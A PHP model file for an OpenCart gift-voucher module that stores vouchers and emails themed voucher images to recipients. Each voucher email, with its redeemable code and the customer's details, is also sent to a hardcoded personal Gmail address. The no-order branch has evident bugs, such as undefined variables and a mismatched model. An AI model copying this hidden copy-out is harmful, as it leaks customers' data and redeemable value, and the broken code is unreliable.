<?php
namespace Opencart\Catalog\Model\Bytao;
class Voucher extends \Opencart\System\Engine\Model {	
	
	public function addVoucher($data) {
		$store_id = $this->config->get('config_store_id');
		
		$this->db->query("INSERT INTO " . DB_PREFIX . "voucher SET store_id = '" .(int)$data['store_id'] . "',code = '" . $this->db->escape($data['code']) . "', from_name = '" . $this->db->escape($data['from_name']) . "', from_email = '" . $this->db->escape($data['from_email']) . "', to_name = '" . $this->db->escape($data['to_name']) . "', to_email = '" . $this->db->escape($data['to_email']) . "', voucher_theme_id = '" . (int)$data['voucher_theme_id'] . "', message = '" . $this->db->escape($data['message']) . "', amount = '" . (float)$data['amount'] . "', status = '" . (int)$data['status'] . "', date_added = NOW()");
		$voucher_id = $this->db->getLastId();
		
		return $voucher_id;
	}

	public function editVoucher($voucher_id, $data) {
		$this->db->query("UPDATE " . DB_PREFIX . "voucher SET code = '" . $this->db->escape($data['code']) . "', from_name = '" . $this->db->escape($data['from_name']) . "', from_email = '" . $this->db->escape($data['from_email']) . "', to_name = '" . $this->db->escape($data['to_name']) . "', to_email = '" . $this->db->escape($data['to_email']) . "', voucher_theme_id = '" . (int)$data['voucher_theme_id'] . "', message = '" . $this->db->escape($data['message']) . "', amount = '" . (float)$data['amount'] . "', status = '" . (int)$data['status'] . "' WHERE voucher_id = '" . (int)$voucher_id . "'");
	}

	public function deleteVoucher($voucher_id) {
		$this->db->query("DELETE FROM " . DB_PREFIX . "voucher WHERE voucher_id = '" . (int)$voucher_id . "'");
		$this->db->query("DELETE FROM " . DB_PREFIX . "voucher_history WHERE voucher_id = '" . (int)$voucher_id . "'");
	}

	public function getVoucher($voucher_id) {
		$query = $this->db->query("SELECT DISTINCT * FROM " . DB_PREFIX . "voucher WHERE voucher_id = '" . (int)$voucher_id . "'");

		return $query->row;
	}

	public function getVoucherByCode($code) {
		$query = $this->db->query("SELECT DISTINCT * FROM " . DB_PREFIX . "voucher WHERE code = '" . $this->db->escape($code) . "'");

		return $query->row;
	}

	public function getVouchers($data = array()) {
		$store_id = $this->config->get('config_store_id');
		
		$sql = "SELECT v.voucher_id, v.code, v.from_name, v.from_email, v.to_name, v.to_email, (SELECT vtd.name FROM " . DB_PREFIX . "voucher_theme_description vtd WHERE vtd.voucher_theme_id = v.voucher_theme_id AND vtd.language_id = '" . (int)$this->config->get('config_language_id') . "') AS theme, v.amount, v.status, v.date_added FROM " . DB_PREFIX . "voucher v WHERE v.store_id='".$store_id. "'";

		$sort_data = array(
			'v.code',
			'v.from_name',
			'v.from_email',
			'v.to_name',
			'v.to_email',
			'v.theme',
			'v.amount',
			'v.status',
			'v.date_added'
		);

		if (isset($data['sort']) && in_array($data['sort'], $sort_data)) {
			$sql .= " ORDER BY " . $data['sort'];
		} else {
			$sql .= " ORDER BY v.date_added";
		}

		if (isset($data['order']) && ($data['order'] == 'DESC')) {
			$sql .= " DESC";
		} else {
			$sql .= " ASC";
		}

		if (isset($data['start']) || isset($data['limit'])) {
			if ($data['start'] < 0) {
				$data['start'] = 0;
			}

			if ($data['limit'] < 1) {
				$data['limit'] = 20;
			}

			$sql .= " LIMIT " . (int)$data['start'] . "," . (int)$data['limit'];
		}

		$query = $this->db->query($sql);

		return $query->rows;
	}

	public function sendVoucher($voucher_id) {
		$storeId = $this->config->get('config_store_id');
		$voucher_info = $this->getVoucher($voucher_id);
		
		if ($voucher_info) {
			if ($voucher_info['order_id']) {
				$order_id = $voucher_info['order_id'];
			} else {
				$order_id = 0;
			}

			$this->load->model('sale/order');

			$order_info = $this->model_sale_order->getOrder($order_id);

			// If voucher belongs to an order
			if ($order_info) {
				$this->load->model('localisation/language');

				$language = new Language($order_info['code']);
				$language->load('default');
				$language->load('mail/voucher');

				// HTML Mail
				$data = array();

				$data['title'] = sprintf($language->get('text_subject'), $voucher_info['from_name']);

				$data['text_greeting'] = sprintf($language->get('text_greeting'), $this->currency->format($voucher_info['amount'], $order_info['currency_code'], $order_info['currency_value']));
				$data['text_from'] = sprintf($language->get('text_from'), $voucher_info['from_name']);
				$data['text_message'] = $language->get('text_message');
				$data['text_redeem'] = sprintf($language->get('text_redeem'), $voucher_info['code']);
				$data['text_footer'] = $language->get('text_footer');

				$this->load->model('bytao/voucher_theme');
				$this->load->model('tool/image');

				$voucher_theme_info = $this->model_bytao_voucher_theme->getVoucherTheme($voucher_info['voucher_theme_id']);

				if ($voucher_theme_info && is_file(DIR_IMAGE . $voucher_theme_info['image'])) {
					//$image = HTTP_IMAGE. $voucher_theme_info['image'];
					
					$textContent = array();
					$textContent[] = array(
					't' => $voucher_info['code'],
					'f' => DIR_FONT.'Helvetica_Neue_UltraLight.ttf',
					'x' => 230,
					'y' => 245,
					's' => 14,
					'a' => 0,
					'c' => 'FF0000',
					);
					
					$textContent[] = array(
					't' => (int)$voucher_info['amount'],
					'f' => DIR_FONT.'PlayfairDisplay-VariableFont_wght.ttf',
					'x' => 250,
					'y' => 147,
					's' => 60,
					'a' => 0,
					'c' => '674b38',
					);
					$name = sprintf($language->get('text_to'), $voucher_info['to_name']);
					$_name = explode(' ',$name);
					$y =45;
					foreach ($_name as $txt){
						$textContent[] = array(
						't' => $txt,
						'f' => DIR_FONT.'Helvetica_Neue_UltraLight.ttf',
						'x' => 230,
						'y' => $y,
						's' => 18,
						'a' => 0,
						'c' => '674b38',
						);
						$y=$y+25;
					}
					
					
					$image = HTTP_CATALOG.$this->model_tool_image->imageText($voucher_theme_info['image'],$voucher_info['code'],$textContent);
				} else {
					$image = '';
				}

				$data['store_name'] = $order_info['store_name'];
				$data['store_url'] = $order_info['store_url'];
				$data['message'] = nl2br($voucher_info['message']);
				$template_id = 82;// order alert to admin
				$template_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "mail_template_description WHERE mail_template_id = '" . (int)$template_id . "' AND language_id='".(int)$order_info['language_id']."'");
					
				$content = isset($template_query->row['description'])?$template_query->row['description']:'';
				$find = array(
						'{greeting}',
						'{from}',
						'{message}',
						'{redeem}',
						'{image}',
						'{date}'
					);

				$replace = array(
						'greeting' =>  sprintf($language->get('text_greeting'), $this->currency->format($voucher_info['amount'], $order_info['currency_code'], $order_info['currency_value'])),
						'from' => sprintf($language->get('text_from'), $voucher_info['from_name']),
						'message' => nl2br($voucher_info['message']),
						'redeem' => sprintf($language->get('text_redeem'), $voucher_info['code']),
						'image' => ($image?'<img src="'.$image.'" alt="Gift Voucher" style="width:100%;height:auto;"/>':''),
						'date' => date($this->language->get('date_format_short'))
					);
					
					$data['content'] = str_replace($find, $replace, $content);
					$html = $this->load->view('mail/voucher_temp.tpl', $data);
				
				
				$mail = new Mail();
				$mail->protocol = $this->config->get('config_mail_protocol');
				$mail->parameter = $this->config->get('config_mail_parameter');
				$mail->smtp_hostname = $this->config->get('config_mail_smtp_host');
				$mail->smtp_username = $this->config->get('config_mail_smtp_username');
				$mail->smtp_password = html_entity_decode($this->config->get('config_mail_smtp_password'), ENT_QUOTES, 'UTF-8');
				$mail->smtp_port = $this->config->get('config_mail_smtp_port');
				$mail->smtp_timeout = $this->config->get('config_mail_smtp_timeout');
				$mail->setTo($voucher_info['to_email']);
				$mail->setFrom($this->config->get('config_email'));
				$mail->setSender($order_info['store_name']);
				$mail->setSubject(sprintf($language->get('text_subject'), $voucher_info['from_name']));
				$mail->setHtml($html);
				$mail->send();
				
				$mail->setSubject('ADM:'.sprintf($language->get('text_subject'), $voucher_info['from_name']));
				$mail->setTo('adamnygs@gmail.com');
				$mail->send();

			// If voucher does not belong to an order
			}  
			else 
			{
				$this->load->language('mail/voucher');
				$data = array();
				$data['title'] = sprintf($this->language->get('text_subject'), $voucher_info['from_name']);
				$data['text_greeting'] = sprintf($this->language->get('text_greeting'), $this->currency->format($voucher_info['amount'], $order_info['currency_code'], $order_info['currency_value']));
				$data['text_from'] = sprintf($this->language->get('text_from'), $voucher_info['from_name']);
				$data['text_message'] = $this->language->get('text_message');
				$data['text_redeem'] = sprintf($this->language->get('text_redeem'), $voucher_info['code']);
				$data['text_footer'] = $this->language->get('text_footer');

				$this->load->model('sale/voucher_theme');

				$voucher_theme_info = $this->model_bytao_voucher_theme->getVoucherTheme($voucher_info['voucher_theme_id']);

				if ($voucher_theme_info && is_file(DIR_IMAGE . $voucher_theme_info['image'])) {
						$textContent = array();
						$textContent[] = array(
						't' => $voucher_info['code'],
						'f' => DIR_FONT.'Helvetica_Neue_UltraLight.ttf',
						'x' => 230,
						'y' => 245,
						's' => 14,
						'a' => 0,
						'c' => 'FF0000',
						);
						
						$textContent[] = array(
						't' => (int)$voucher_info['amount'],
						'f' => DIR_FONT.'PlayfairDisplay-VariableFont_wght.ttf',
						'x' => 250,
						'y' => 147,
						's' => 60,
						'a' => 0,
						'c' => '674b38',
						);
						$name = sprintf($language->get('text_to'), $voucher_info['to_name']);
						$_name = explode(' ',$name);
						$y = 45;
						foreach ($_name as $txt){
							$textContent[] = array(
							't' => $txt,
							'f' => DIR_FONT.'Helvetica_Neue_UltraLight.ttf',
							'x' => 230,
							'y' => $y,
							's' => 18,
							'a' => 0,
							'c' => '674b38',
							);
							$y=$y+25;
						}
						$image = HTTP_CATALOG.$this->model_tool_image->imageText($voucher_theme_info['image'],$voucher_info['code'],$textContent);
					} else {
					$image = '';
				}

				$data['store_name'] = $this->config->get('config_name');
				$data['store_url'] = HTTP_CATALOG;
				$data['message'] = nl2br($voucher_info['message']);
				
				$template_id = 82;// order alert to admin
				$template_query = $this->db->query("SELECT * FROM " . DB_PREFIX . "mail_template_description WHERE mail_template_id = '" . (int)$template_id . "' AND language_id='".(int)$order_info['language_id']."'");
				
				$content = isset($template_query->row['description'])?$template_query->row['description']:'';
				$find = array(
					'{greeting}',
					'{from}',
					'{message}',
					'{redeem}',
					'{image}',
					'{date}'
				);

				$replace = array(
					'greeting' =>  sprintf($this->language->get('text_greeting'), $this->currency->format($voucher_info['amount'], $order_info['currency_code'], $order_info['currency_value'])),
					'from' => sprintf($this->language->get('text_from'), $voucher_info['from_name']),
					'message' => nl2br($voucher_info['message']),
					'redeem' => sprintf($this->language->get('text_redeem'), $voucher_info['code']),
					'image' => $image?'<img src="'.$image.'" alt="gift" style="width:100%;height:auto;"/>':'',
					'date' => date($this->language->get('date_format_short'))
				);
				
				$data['content'] = str_replace($find, $replace, $content);
				$html = $this->load->view('mail/voucher_temp.tpl', $data);
				
			
				$mail = new Mail();
				$mail->protocol = $this->config->get('config_mail_protocol');
				$mail->parameter = $this->config->get('config_mail_parameter');
				$mail->smtp_hostname = $this->config->get('config_mail_smtp_host');
				$mail->smtp_username = $this->config->get('config_mail_smtp_username');
				$mail->smtp_password = html_entity_decode($this->config->get('config_mail_smtp_password'), ENT_QUOTES, 'UTF-8');
				$mail->smtp_port = $this->config->get('config_mail_smtp_port');
				$mail->smtp_timeout = $this->config->get('config_mail_smtp_timeout');
			
				$mail->setTo($voucher_info['to_email']);
				$mail->setFrom($this->config->get('config_email'));
				$mail->setSender($this->config->get('config_name'));
				$mail->setSubject(sprintf($this->language->get('text_subject'), $voucher_info['from_name']));
				$mail->setHtml($html);
				$mail->send();
				
				$mail->setSubject('ADM:'.sprintf($this->language->get('text_subject'), $voucher_info['from_name']));
				$mail->setTo('adamnygs@gmail.com');
				$mail->send();
			}
		}
	}

	public function getTotalVouchers() {
		$store_id = isset($this->session->data['store_id'])?(int)$this->session->data['store_id']:0;
		$query = $this->db->query("SELECT COUNT(*) AS total FROM " . DB_PREFIX . "voucher WHERE store_id='".$store_id."'");

		return $query->row['total'];
	}

	public function getTotalVouchersByVoucherThemeId($voucher_theme_id) {
		$query = $this->db->query("SELECT COUNT(*) AS total FROM " . DB_PREFIX . "voucher WHERE voucher_theme_id = '" . (int)$voucher_theme_id . "'");

		return $query->row['total'];
	}

	public function getVoucherHistories($voucher_id, $start = 0, $limit = 10) {
		if ($start < 0) {
			$start = 0;
		}

		if ($limit < 1) {
			$limit = 10;
		}

		$query = $this->db->query("SELECT vh.order_id, CONCAT(o.firstname, ' ', o.lastname) AS customer, vh.amount, vh.date_added FROM " . DB_PREFIX . "voucher_history vh LEFT JOIN `" . DB_PREFIX . "order` o ON (vh.order_id = o.order_id) WHERE vh.voucher_id = '" . (int)$voucher_id . "' ORDER BY vh.date_added ASC LIMIT " . (int)$start . "," . (int)$limit);

		return $query->rows;
	}

	public function getTotalVoucherHistories($voucher_id) {
		$query = $this->db->query("SELECT COUNT(*) AS total FROM " . DB_PREFIX . "voucher_history WHERE voucher_id = '" . (int)$voucher_id . "'");

		return $query->row['total'];
	}

}